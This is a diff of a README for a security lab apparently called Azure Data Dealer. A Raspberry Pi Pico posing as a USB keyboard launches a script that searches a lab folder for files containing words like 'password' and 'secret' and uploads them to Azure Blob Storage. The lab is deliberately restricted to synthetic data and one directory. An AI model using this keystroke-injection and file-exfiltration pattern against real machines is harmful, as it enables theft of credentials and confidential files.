@@ -1,18 +1,14 @@
-**AZURE**
-
-**DATA DEALER**
+# **AZURE-DATA-DEALER**
 
 Raspberry Pi Pico USB HID \+ Azure Blob Storage Security Lab
 
 A deliberately constrained educational project that demonstrates how a USB HID device can trigger a pre-installed host script, discover synthetic files inside specific directories only, and upload matching test data to a private Azure Blob Storage container.
 
-**Documentation**
-
 *Safe-by-design • Reproducible • Beginner-friendly*
 
 *For Educational Use Only*
 
-**Ethics and Use**
+# **Ethics and Use**
 
 Azure Data Dealer is intended for controlled learning environments, personal lab systems, classroom demonstrations, and explicitly authorized security testing. Do not adapt the project to search arbitrary user directories, collect real credentials, conceal activity, bypass security controls, or transfer data from systems you do not own or have permission to test.
 
@@ -39,23 +35,23 @@ The purpose is not to create a real data-stealing device. The project demonstrat
 
 # **3\. Architecture**
 
-Raspberry Pi Pico  
-      |  
-      | USB HID keystrokes  
-      v  
-Windows test machine  
-      |  
-      | launches E:\\FileLab\\run\_demo.bat  
-      v  
-Python host script  
-      |  
-      | scans ONLY E:\\FileLab\\data  
-      | matches synthetic keywords  
-      v  
-Azure SDK over HTTPS  
-      |  
-      v  
-Private Azure Blob Storage container
+      Raspberry Pi Pico  
+            |  
+            | USB HID keystrokes  
+            v  
+      Windows test machine  
+            |  
+            | launches E:\\FileLab\\run\_demo.bat  
+            v  
+      Python host script  
+            |  
+            | scans ONLY E:\\FileLab\\data  
+            | matches synthetic keywords  
+            v  
+      Azure SDK over HTTPS  
+            |  
+            v  
+      Private Azure Blob Storage container
 
 This architecture intentionally separates the HID device from the network operation. The Pico is the trigger; Windows is the execution environment; Azure is the destination for controlled test data.
 
@@ -100,7 +96,7 @@ Keep anonymous access disabled so that the container remains private.
 
 Open Command Prompt on the Windows test machine and run: 
 
-py \-m pip install azure-storage-blob
+      py \-m pip install azure-storage-blob
 
 *This can be run as part of a self-recycling .py for new machines that do not have Azure Python SDK installed.*
 
@@ -108,7 +104,7 @@ py \-m pip install azure-storage-blob
 
 For this beginner lab, store the Storage Account connection string in a Windows environment variable. Do not place the connection string inside the Python source code.
 
-setx AZURE\_STORAGE\_CONNECTION\_STRING "PASTE-YOUR-CONNECTION-STRING-HERE"
+      setx AZURE\_STORAGE\_CONNECTION\_STRING "PASTE-YOUR-CONNECTION-STRING-HERE"
 
 Close that Command Prompt window and open a new one before testing the Python script.
 
@@ -116,17 +112,17 @@ Close that Command Prompt window and open a new one before testing the Python sc
 
 Create the following structure on the E: drive:
 
-E:\\FileLab  
-│  
-├── .ducky\_lab\_marker  
-├── upload\_demo.py  
-├── run\_demo.bat  
-└── data  
-    ├── sensitive\_data.txt  
-    ├── holiday.txt  
-    ├── company\_confidential.txt  
-    ├── shopping\_list.txt  
-    └── accounts.csv
+      E:\\FileLab  
+      │  
+      ├── .ducky\_lab\_marker  
+      ├── upload\_demo.py  
+      ├── run\_demo.bat  
+      └── data  
+          ├── sensitive\_data.txt  
+          ├── holiday.txt  
+          ├── company\_confidential.txt  
+          ├── shopping\_list.txt  
+          └── accounts.csv
 
 The .ducky\_lab\_marker file can be empty. Its presence is simply a safety signal that confirms the script is running inside the intended training directory.
 
@@ -134,99 +130,99 @@ The .ducky\_lab\_marker file can be empty. Its presence is simply a safety signa
 
 Example for E:\\FileLab\\data\\sensitive\_data.txt:
 
-THIS IS FAKE LAB DATA
-
-Customer: Example User  
-Account: 12345678  
-Password: DefinitelyNotARealPassword
+      THIS IS FAKE LAB DATA
+      
+      Customer: Example User  
+      Account: 12345678  
+      Password: DefinitelyNotARealPassword
 
 Example for E:\\FileLab\\data\\accounts.csv:
 
-username,password  
-testuser1,fakepassword123  
-testuser2,notreal456
+      username,password  
+      testuser1,fakepassword123  
+      testuser2,notreal456
 
 # **8\. Host Scanner and Azure Uploader**
 
 Save the following as E:\\FileLab\\upload\_demo.py. The code intentionally refuses to roam outside the lab directory.
 
-from pathlib import Path  
-from datetime import datetime, timezone  
-import os
+      from pathlib import Path  
+      from datetime import datetime, timezone  
+      import os
+      
+      from azure.storage.blob import BlobServiceClient
 
-from azure.storage.blob import BlobServiceClient
-
-\# \------------------------------------------------------------  
-\# LAB SAFETY SETTINGS  
-\# \------------------------------------------------------------
-
-LAB\_ROOT \= Path(r"E:\\FileLab").resolve()  
-DATA\_FOLDER \= (LAB\_ROOT / "data").resolve()  
-MARKER\_FILE \= LAB\_ROOT / ".ducky\_lab\_marker"
-
-CONTAINER\_NAME \= "ducky-lab"
-
-KEYWORDS \= \[  
-    "sensitive",  
-    "sensitive data",  
-    "confidential",  
-    "secret",  
-    "password",  
-\]
-
-ALLOWED\_EXTENSIONS \= {  
-    ".txt",  
-    ".csv",  
-    ".json",  
-    ".md",  
-}
-
-MAX\_FILE\_SIZE \= 512 \* 1024
-
-\# \------------------------------------------------------------  
-\# SAFETY CHECKS  
-\# \------------------------------------------------------------
-
-EXPECTED\_ROOT \= Path(r"E:\\FileLab").resolve()
-
-if LAB\_ROOT \!= EXPECTED\_ROOT:  
-    raise RuntimeError("Safety check failed: unexpected lab directory.")
-
-if not MARKER\_FILE.exists():  
-    raise RuntimeError("Safety marker missing. Refusing to scan.")
-
-if not DATA\_FOLDER.exists():  
-    raise RuntimeError(r"E:\\FileLab\\data does not exist.")
-
-\# \------------------------------------------------------------  
-\# CONNECT TO AZURE  
-\# \------------------------------------------------------------
-
-connection\_string \= os.getenv("AZURE\_STORAGE\_CONNECTION\_STRING")
-
-if not connection\_string:  
-    raise RuntimeError(  
-        "AZURE\_STORAGE\_CONNECTION\_STRING is not configured."  
-    )
-
-blob\_service \= BlobServiceClient.from\_connection\_string(  
-    connection\_string  
-)
-
-container \= blob\_service.get\_container\_client(CONTAINER\_NAME)
-
-\# \------------------------------------------------------------  
-\# SEARCH THE LAB DIRECTORY ONLY  
-\# \------------------------------------------------------------
-
-print()  
-print("=== Azure Data Dealer Lab \===")  
-print(f"Scanning ONLY: {DATA\_FOLDER}")  
-print()
-
-matches \= \[\]
-
-for file\_path in DATA\_FOLDER.rglob("\*"):
+      \# \------------------------------------------------------------  
+      \# LAB SAFETY SETTINGS  
+      \# \------------------------------------------------------------
+      
+      LAB\_ROOT \= Path(r"E:\\FileLab").resolve()  
+      DATA\_FOLDER \= (LAB\_ROOT / "data").resolve()  
+      MARKER\_FILE \= LAB\_ROOT / ".ducky\_lab\_marker"
+      
+      CONTAINER\_NAME \= "ducky-lab"
+      
+      KEYWORDS \= \[  
+          "sensitive",  
+          "sensitive data",  
+          "confidential",  
+          "secret",  
+          "password",  
+      \]
+      
+      ALLOWED\_EXTENSIONS \= {  
+          ".txt",  
+          ".csv",  
+          ".json",  
+          ".md",  
+      }
+      
+      MAX\_FILE\_SIZE \= 512 \* 1024
+      
+      \# \------------------------------------------------------------  
+      \# SAFETY CHECKS  
+      \# \------------------------------------------------------------
+      
+      EXPECTED\_ROOT \= Path(r"E:\\FileLab").resolve()
+      
+      if LAB\_ROOT \!= EXPECTED\_ROOT:  
+          raise RuntimeError("Safety check failed: unexpected lab directory.")
+      
+      if not MARKER\_FILE.exists():  
+          raise RuntimeError("Safety marker missing. Refusing to scan.")
+      
+      if not DATA\_FOLDER.exists():  
+          raise RuntimeError(r"E:\\FileLab\\data does not exist.")
+      
+      \# \------------------------------------------------------------  
+      \# CONNECT TO AZURE  
+      \# \------------------------------------------------------------
+      
+      connection\_string \= os.getenv("AZURE\_STORAGE\_CONNECTION\_STRING")
+      
+      if not connection\_string:  
+          raise RuntimeError(  
+              "AZURE\_STORAGE\_CONNECTION\_STRING is not configured."  
+          )
+      
+      blob\_service \= BlobServiceClient.from\_connection\_string(  
+          connection\_string  
+      )
+      
+      container \= blob\_service.get\_container\_client(CONTAINER\_NAME)
+      
+      \# \------------------------------------------------------------  
+      \# SEARCH THE LAB DIRECTORY ONLY  
+      \# \------------------------------------------------------------
+      
+      print()  
+      print("=== Azure Data Dealer Lab \===")  
+      print(f"Scanning ONLY: {DATA\_FOLDER}")  
+      print()
+      
+      matches \= \[\]
+      
+      for file\_path in DATA\_FOLDER.rglob("\*"):
 
     if not file\_path.is\_file():  
         continue
@@ -277,18 +273,18 @@ for file\_path in DATA\_FOLDER.rglob("\*"):
     if hits:  
         matches.append((file\_path, hits))
 
-\# \------------------------------------------------------------  
-\# DISPLAY AND UPLOAD MATCHES  
-\# \------------------------------------------------------------
-
-print(f"Found {len(matches)} matching lab file(s).")  
-print()
-
-timestamp \= datetime.now(  
-    timezone.utc  
-).strftime("%Y%m%dT%H%M%SZ")
-
-for file\_path, hits in matches:
+      \# \------------------------------------------------------------  
+      \# DISPLAY AND UPLOAD MATCHES  
+      \# \------------------------------------------------------------
+      
+      print(f"Found {len(matches)} matching lab file(s).")  
+      print()
+      
+      timestamp \= datetime.now(  
+          timezone.utc  
+      ).strftime("%Y%m%dT%H%M%SZ")
+      
+      for file\_path, hits in matches:
 
     relative\_path \= file\_path.relative\_to(DATA\_FOLDER)
 
@@ -311,54 +307,54 @@ for file\_path, hits in matches:
     print("Uploaded successfully.")  
     print()
 
-print("=== Lab complete \===")
+      print("=== Lab complete \===")
 
 # 
 
-# **9\. Batch Launcher**
+# **9\. Batch Launcher** #
 
 Save this as E:\\FileLab\\run\_demo.bat:
 
-@echo off
-
-echo \======================================  
-echo Azure Data Dealer \- Security Lab  
-echo \======================================
-
-py E:\\FileLab\\upload\_demo.py
-
-echo.  
-echo Demo finished.  
-pause
+      @echo off
+      
+      echo \======================================  
+      echo Azure Data Dealer \- Security Lab  
+      echo \======================================
+      
+      py E:\\FileLab\\upload\_demo.py
+      
+      echo.  
+      echo Demo finished.  
+      pause
 
 # **10\. Raspberry Pi Pico code.py**
 
 The Pico's job is intentionally simple: wait for Windows to recognize the HID device, open the Run dialog, and launch the lab batch file.
 
-import time  
-import usb\_hid
-
-from adafruit\_hid.keyboard import Keyboard  
-from adafruit\_hid.keyboard\_layout\_us import KeyboardLayoutUS  
-from adafruit\_hid.keycode import Keycode
-
-keyboard \= Keyboard(usb\_hid.devices)  
-layout \= KeyboardLayoutUS(keyboard)
-
-\# Give Windows time to recognize the Pico.  
-time.sleep(3)
-
-\# Open the Windows Run dialog.  
-keyboard.press(Keycode.WINDOWS, Keycode.R)  
-keyboard.release\_all()
-
-time.sleep(1)
-
-\# Launch the deliberately installed lab program.  
-layout.write(r"E:\\FileLab\\run\_demo.bat")
-
-keyboard.press(Keycode.ENTER)  
-keyboard.release\_all()
+      import time  
+      import usb\_hid
+      
+      from adafruit\_hid.keyboard import Keyboard  
+      from adafruit\_hid.keyboard\_layout\_us import KeyboardLayoutUS  
+      from adafruit\_hid.keycode import Keycode
+      
+      keyboard \= Keyboard(usb\_hid.devices)  
+      layout \= KeyboardLayoutUS(keyboard)
+      
+      \# Give Windows time to recognize the Pico.  
+      time.sleep(3)
+      
+      \# Open the Windows Run dialog.  
+      keyboard.press(Keycode.WINDOWS, Keycode.R)  
+      keyboard.release\_all()
+      
+      time.sleep(1)
+      
+      \# Launch the deliberately installed lab program.  
+      layout.write(r"E:\\FileLab\\run\_demo.bat")
+      
+      keyboard.press(Keycode.ENTER)  
+      keyboard.release\_all()
 
 # **11\. End-to-End Test**
 
@@ -372,27 +368,27 @@ keyboard.release\_all()
 
 ## **11.1 Expected result**
 
-\=== Azure Data Dealer Lab \===  
-Scanning ONLY: E:\\FileLab\\data
-
-Found 3 matching lab file(s).
-
-MATCH: sensitive\_data.txt  
-Keywords: password, sensitive, sensitive data  
-Uploading as: 20260913T055000Z/sensitive\_data.txt  
-Uploaded successfully.
-
-MATCH: company\_confidential.txt  
-Keywords: confidential  
-Uploading as: 20260913T055000Z/company\_confidential.txt  
-Uploaded successfully.
-
-MATCH: accounts.csv  
-Keywords: password  
-Uploading as: 20260913T055000Z/accounts.csv  
-Uploaded successfully.
-
-\=== Lab complete \===
+      \=== Azure Data Dealer Lab \===  
+      Scanning ONLY: E:\\FileLab\\data
+      
+      Found 3 matching lab file(s).
+      
+      MATCH: sensitive\_data.txt  
+      Keywords: password, sensitive, sensitive data  
+      Uploading as: 20260913T055000Z/sensitive\_data.txt  
+      Uploaded successfully.
+      
+      MATCH: company\_confidential.txt  
+      Keywords: confidential  
+      Uploading as: 20260913T055000Z/company\_confidential.txt  
+      Uploaded successfully.
+      
+      MATCH: accounts.csv  
+      Keywords: password  
+      Uploading as: 20260913T055000Z/accounts.csv  
+      Uploaded successfully.
+      
+      \=== Lab complete \===
 
 # **13\. Defensive Security Takeaways**
 
